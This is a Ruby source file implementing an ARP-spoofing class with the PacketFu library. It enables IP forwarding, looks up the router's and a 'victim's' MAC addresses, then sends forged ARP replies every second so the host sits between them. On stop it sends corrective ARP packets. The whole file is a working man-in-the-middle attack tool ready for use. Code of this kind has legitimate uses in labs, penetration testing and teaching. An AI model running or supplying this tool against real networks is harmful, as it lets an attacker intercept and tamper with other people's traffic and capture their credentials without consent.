require 'packetfu'

class Arpspoof

  def Arpspoof.forward(forward)
    if RUBY_PLATFORM =~ /darwin/
      if forward then
        `sysctl -w net.inet.ip.forwarding=1`
      end

      if !forward then
        `sysctl -w net.inet.ip.forwarding=0`
      end
    else
      if forward then
        `echo 1 > /proc/sys/net/ipv4/ip_forward`
      end

      if !forward then
        `echo 0 > /proc/sys/net/ipv4/ip_forward`
      end
    end

  end



  #initialize with router IP, victim IP, and desired interface, route and vic mac addresses are determined 
  #by crafting an ARP packet using host IP and MAC to determine the required information
  def initialize(route_ip,vic_ip,interface)

    @interface = interface
    @ipcfg = PacketFu::Utils.whoami?(:iface=>@interface)

    @route_ip = route_ip
    @vic_ip = vic_ip

    @route_mac = nil
    route_mac_count = 0
    while @route_mac.nil? && route_mac_count < 5 do
      puts "Attempting to get router #{@route_ip} MAC address..."
      @route_mac=PacketFu::Utils::arp(@route_ip, 
                                      :iface => @interface, 
                                      :eth_saddr=> PacketFu::Utils.ifconfig(@interface)[:eth_saddr], 
                                      :ip_saddr=>PacketFu::Utils.ifconfig(@interface)[:ip_saddr])
      route_mac_count += 1
    end
    if @route_mac == nil then
      puts "Couldn't determine router MAC"
      exit 1
    end

    puts "Router MAC address obtained"

    
    @vic_mac = nil
    vic_mac_count = 0

    while @vic_mac.nil? && vic_mac_count < 5 do
      puts "Attempting to get victim #{@vic_ip} MAC address..."
      @vic_mac = PacketFu::Utils::arp(@vic_ip, 
                                      :iface => @interface, 
                                      :eth_saddr=> PacketFu::Utils.ifconfig(@interface)[:eth_saddr], 
                                      :ip_saddr=>PacketFu::Utils.ifconfig(@interface)[:ip_saddr])
      vic_mac_count += 1
    end

    if @vic_mac == nil then
      puts "Couldn't determine victim MAC"
      exit 1
    end

    puts "Victim MAC address obtained"



  end


  #starts arp spoofing process, continues until stop called
  def spoof
    
    @send_spoofs = true

    arp_pkt_to_vic = PacketFu::ARPPacket.new()
    arp_pkt_to_vic.eth_saddr = @ipcfg[:eth_saddr]
    arp_pkt_to_vic.eth_daddr = @vic_mac
    arp_pkt_to_vic.arp_saddr_mac = @ipcfg[:eth_saddr]
    arp_pkt_to_vic.arp_daddr_mac = @vic_mac
    arp_pkt_to_vic.arp_saddr_ip = @route_ip
    arp_pkt_to_vic.arp_daddr_ip = @vic_ip
    arp_pkt_to_vic.arp_opcode = 2

    arp_pkt_to_route = PacketFu::ARPPacket.new()
    arp_pkt_to_route.eth_saddr = @ipcfg[:eth_saddr]
    arp_pkt_to_route.eth_daddr = @route_mac
    arp_pkt_to_route.arp_saddr_mac = @ipcfg[:eth_saddr]
    arp_pkt_to_route.arp_daddr_mac = @route_mac
    arp_pkt_to_route.arp_saddr_ip = @vic_ip
    arp_pkt_to_route.arp_daddr_ip = @route_ip
    arp_pkt_to_route.arp_opcode = 2


    while @send_spoofs do
      arp_pkt_to_vic.to_w(@interface)
      arp_pkt_to_route.to_w(@interface)
      sleep 1
    end

    puts "Stopping Arpspoof"

    puts "Sending correct ARP to victim"
    arp_pkt_to_vic.eth_saddr = @route_mac
    arp_pkt_to_vic.arp_saddr_mac = @route_mac
    arp_pkt_to_vic.to_w(@interface)

    puts "Sending correct ARP to router"
    arp_pkt_to_route.eth_saddr = @vic_mac
    arp_pkt_to_route.arp_saddr_mac = @vic_mac
    arp_pkt_to_route.to_w(@interface)

  end

  #ends arp spoofing
  def stop
    @send_spoofs = false
  end

end